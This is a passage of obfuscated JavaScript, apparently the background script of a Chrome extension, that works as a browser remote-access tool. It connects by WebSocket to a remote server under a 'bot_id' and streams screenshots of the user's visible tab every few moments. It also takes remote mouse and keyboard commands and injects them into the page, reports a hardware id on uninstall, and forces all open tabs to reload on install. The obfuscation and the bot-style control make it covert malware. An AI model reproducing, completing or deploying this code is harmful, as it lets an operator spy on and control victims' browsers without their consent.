    console['warn']('[remote] inject FAILED',_0x50be73['type'],_0x7c507);
  });
}
function _0x5a7b(_0x5b1c08,_0x2b91ef){
  _0x5b1c08=_0x5b1c08-0x1a1;
  const _0x50dd59=_0x50dd();
  let _0x5a7bc1=_0x50dd59[_0x5b1c08];
  if(_0x5a7b['LMChpk']===undefined){
    var _0x235a71=function(_0x2fb4f0){
      const _0x3c701c='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
      let _0x514a4f='',_0x6a00cd='';
      for(let _0x3a9cf5=0x0,_0x30193f,_0x39ff8f,_0x26abc3=0x0;
      _0x39ff8f=_0x2fb4f0['charAt'](_0x26abc3++);
      ~_0x39ff8f&&(_0x30193f=_0x3a9cf5%0x4?_0x30193f*0x40+_0x39ff8f:_0x39ff8f,_0x3a9cf5++%0x4)?_0x514a4f+=String['fromCharCode'](0xff&_0x30193f>>(-0x2*_0x3a9cf5&0x6)):0x0){
        _0x39ff8f=_0x3c701c['indexOf'](_0x39ff8f);
      }
      for(let _0x1b1b37=0x0,_0x43daa1=_0x514a4f['length'];
      _0x1b1b37<_0x43daa1;
      _0x1b1b37++){
        _0x6a00cd+='%'+('00'+_0x514a4f['charCodeAt'](_0x1b1b37)['toString'](0x10))['slice'](-0x2);
      }
      return decodeURIComponent(_0x6a00cd);
    };
    _0x5a7b['YHKtYP']=_0x235a71,_0x5a7b['SMSyKb']={
    },_0x5a7b['LMChpk']=!![];
  }
  const _0x5fee3b=_0x50dd59[0x0],_0x57c307=_0x5b1c08+_0x5fee3b,_0x226f18=_0x5a7b['SMSyKb'][_0x57c307];
  return!_0x226f18?(_0x5a7bc1=_0x5a7b['YHKtYP'](_0x5a7bc1),_0x5a7b['SMSyKb'][_0x57c307]=_0x5a7bc1):_0x5a7bc1=_0x226f18,_0x5a7bc1;
}
let ue=0x0,ee=Promise['resolve']();
function At(){
  const _0x4dc766=_0x28cede;
  return ee=ee['then'](()=>Ct())['catch'](()=>{
  }),ee;
}
async function Ct(){
  const _0x2c4cfb=_0x28cede;
  H(),P=!0x0;
  const _0x49e4ea=++ue,_0x1376d=await We();
  if(!(_0x49e4ea!==ue||!P)){
    if(!(_0x1376d!=null&&_0x1376d['id'])||_0x1376d['windowId']===void 0x0){
      console['warn']('[remote] no capturable tab'),H();
      return;
    }
    T=_0x1376d['windowId'],_=_0x1376d['id'],O=_0x4885da=>{
      const _0x374b6d=_0x2c4cfb;
      _0x4885da['windowId']===T&&(_=_0x4885da['tabId']);
    },chrome['tabs']['onActivated']['addListener'](O),N=_0x19ee12=>{
      _0x19ee12===_&&ke();
    },chrome['tabs']['onRemoved']['addListener'](N),K=setInterval(()=>{
      const _0x1b1e33=_0x2c4cfb;
      !P||!f||f['readyState']!==WebSocket['OPEN']||T!==void 0x0&&chrome['tabs']['captureVisibleTab'](T,{
        'format':'jpeg','quality':0x37
      })['then'](_0x164ff7=>{
        const _0x3e7cf1=_0x1b1e33;
        f&&f['readyState']===WebSocket['OPEN']&&f['send'](JSON['stringify']({
          'type':'frame','data':_0x164ff7
        }));
      })['catch'](()=>{
        ke();
      });
    },_t);
  }
}
async function ke(){
  const _0xb7bf08=_0x28cede;
  if(!P)return;
  const _0x1bedfd=await We();
  _0x1bedfd!=null&&_0x1bedfd['id']&&_0x1bedfd['windowId']!==void 0x0&&(_=_0x1bedfd['id'],T=_0x1bedfd['windowId']);
}
function H(){
  const _0x16afcd=_0x28cede;
  ue++,P=!0x1,_=void 0x0,T=void 0x0,K!==void 0x0&&(clearInterval(K),K=void 0x0),O!==null&&(chrome['tabs']['onActivated']['removeListener'](O),O=null),N!==null&&(chrome['tabs']['onRemoved']['removeListener'](N),N=null);
}
let q=null,de=!0x1;
function Rt(){
  de=!0x1,q&&(De(q),q=null);
}
function Ee(_0x25a9ee,_0x5b9721){
  const _0x8f0f10=_0x28cede,_0x5708f9=_0x5f8bef=>{
    const _0x3e980b=_0x5a7b,_0x2ce9a6=_0x25a9ee[_0x5f8bef];
    return typeof _0x2ce9a6=='number'?_0x2ce9a6:Number(_0x2ce9a6??0x0)||0x0;
  },_0xd0154a=_0x4c3fb7=>{
    const _0x36bc92=_0x5a7b,_0x58ba5c=_0x25a9ee[_0x4c3fb7];
    return typeof _0x58ba5c=='string'?_0x58ba5c:'';
  },_0x389b6c=_0x1df5c7=>!!_0x25a9ee[_0x1df5c7],_0x5410e7=_0xd0154a('button'),_0x3cc9af=_0x5410e7==='right'?0x2:_0x5410e7==='middle'?0x1:0x0;
  return{
    'type':_0x5b9721,'x':_0x5708f9('x'),'y':_0x5708f9('y'),'btn':_0x3cc9af,'dx':_0x5708f9('deltaX'),'dy':_0x5708f9('deltaY'),'key':_0xd0154a('key'),'code':_0xd0154a('code'),'keyCode':_0x5708f9('keyCode'),'text':_0xd0154a('text'),'ctrl':_0x389b6c('ctrl'),'shift':_0x389b6c('shift'),'alt':_0x389b6c('alt'),'meta':_0x389b6c('meta')
  };
}
async function Pt(_0x472469){
  const _0x2913dd=_0x28cede;
  let _0x3f5f98;
  try{
    _0x3f5f98=JSON['parse'](_0x472469);
  }
  catch{
    return;
  }
  const _0x194eea=typeof _0x3f5f98['type']=='string'?_0x3f5f98['type']:'';
  if(_0x194eea!=='mouse_move'&&console['log']('[remote] msg',_0x194eea),_0x194eea==='remote_start'){
    await At(),console['log']('[remote] streaming started, target tab=',_);
    return;
  }
  if(_0x194eea==='remote_stop'){
    H();
    return;
  }
  if(_0x194eea==='mouse_move'){
    q=Ee(_0x3f5f98,_0x194eea),de||(de=!0x0,setTimeout(Rt,0x10));
    return;
  }
  (_0x194eea==='mouse_down'||_0x194eea==='mouse_up'||_0x194eea==='scroll'||_0x194eea==='key_down'||_0x194eea==='key_up')&&De(Ee(_0x3f5f98,_0x194eea));
}
let R=null;
async function Me(){
  const _0x1c337a=_0x28cede;
  if(!(f&&(f['readyState']===WebSocket['OPEN']||f['readyState']===WebSocket['CONNECTING'])))return R||(R=((async()=>{
    const _0x5da3e9=_0x1c337a;
    try{
      if(f&&(f['readyState']===WebSocket['OPEN']||f['readyState']===WebSocket['CONNECTING']))return;
      const _0x13a1ef=await v();
      if(!_0x13a1ef){
        console['warn']('[remote] no botId');
        return;
      }
      if(f&&(f['readyState']===WebSocket['OPEN']||f['readyState']===WebSocket['CONNECTING']))return;
      const _0x426e97=kt()+('/api/v1/ext/remote?api_key=')+encodeURIComponent(me)+('&bot_id=')+encodeURIComponent(_0x13a1ef);
      console['log']('[remote] connecting to',_0x426e97['split']('?')[0x0]);
      const _0x53a111=new WebSocket(_0x426e97);
      f=_0x53a111,_0x53a111['onopen']=()=>{
        const _0x3f8742=_0x5da3e9;
        f===_0x53a111&&(console['log']('[remote] WS OPEN'),clearTimeout(le),E!==void 0x0&&clearInterval(E),E=setInterval(()=>{
          const _0x4815e3=_0x3f8742;
          if(f===_0x53a111&&_0x53a111['readyState']===WebSocket['OPEN'])try{
            _0x53a111['send'](JSON['stringify']({
              'type':'ping'
            }));
          }
          catch{
          }
        },xt));
      },_0x53a111['onmessage']=_0x26b37a=>{
        const _0xc64c6c=_0x5da3e9;
        f===_0x53a111&&Pt(_0x26b37a['data']);
      },_0x53a111['onclose']=_0x1cfc1e=>{
        const _0x410834=_0x5da3e9;
        f===_0x53a111&&(console['warn']('[remote] WS CLOSED',_0x1cfc1e['code'],_0x1cfc1e['reason']),H(),E!==void 0x0&&(clearInterval(E),E=void 0x0),f=null,Tt());
      },_0x53a111['onerror']=()=>{
        const _0x3152b4=_0x5da3e9;
        f===_0x53a111&&(console['error']('[remote] WS ERROR'),_0x53a111['close']());
      };
    }
    finally{
      R=null;
    }
  })()),R);
}
async function Ot(){
  const _0x300b38=_0x28cede,_0x34c7ff=await v();
  if(!_0x34c7ff)return;
  const _0x28eba0=g();
  let _0x384259=fe['replace'](/\/$/,'')+('/api/v1/ext/uninstall?hwid=')+encodeURIComponent(_0x34c7ff)+'&key='+encodeURIComponent(me);
  _0x28eba0&&_0x28eba0!=='Unknown'&&(_0x384259+='&browser='+encodeURIComponent(_0x28eba0)),await chrome['runtime']['setUninstallURL'](_0x384259);
}
async function Nt(){
  const _0x5c276b=_0x28cede;
  try{
    const _0x29bb12=await chrome['tabs']['query']({
    });
    for(const _0x2065b1 of _0x29bb12){
      const _0x397484=_0x2065b1['url']??'';
      !_0x2065b1['id']||!_0x397484['startsWith']('http://')&&!_0x397484['startsWith']('https://')||chrome['tabs']['reload'](_0x2065b1['id'])['catch'](()=>{
      });
    }
  }
  catch{
  }
}
async function $(){
  const _0x38ff28=await k([ne]);
  await Fe(String(_0x38ff28[ne]??'')),await Ae(),await Ot(),await Ce(),await Re(),await j(),Me();
}
function Lt(){
  const _0xf44d16=_0x28cede;
  ft(async()=>{
    await j();
  }),chrome['alarms']['create']('bp_tick',{
    'periodInMinutes':0x1
  }),chrome['alarms']['onAlarm']['addListener'](_0x351a89=>{
    const _0x5dd155=_0xf44d16;
    _0x351a89['name']==='bp_tick'&&$();
  }),chrome['runtime']['onMessage']['addListener'](_0x50cfd1=>{
    const _0x30b7a7=_0xf44d16;
    _0x50cfd1['type']==='BP_HEARTBEAT'&&j();
  }),chrome['runtime']['onInstalled']['addListener'](_0x1213c7=>{
    const _0x22170b=_0xf44d16;
    $(),(_0x1213c7['reason']==='update'||_0x1213c7['reason']==='install')&&Nt();
  }),chrome['runtime']['onStartup']['addListener'](()=>void $()),setInterval(()=>void j(),0x3a98),$();
}
function Wt(){
  rt(),et(),nt(),Lt();
}
Wt();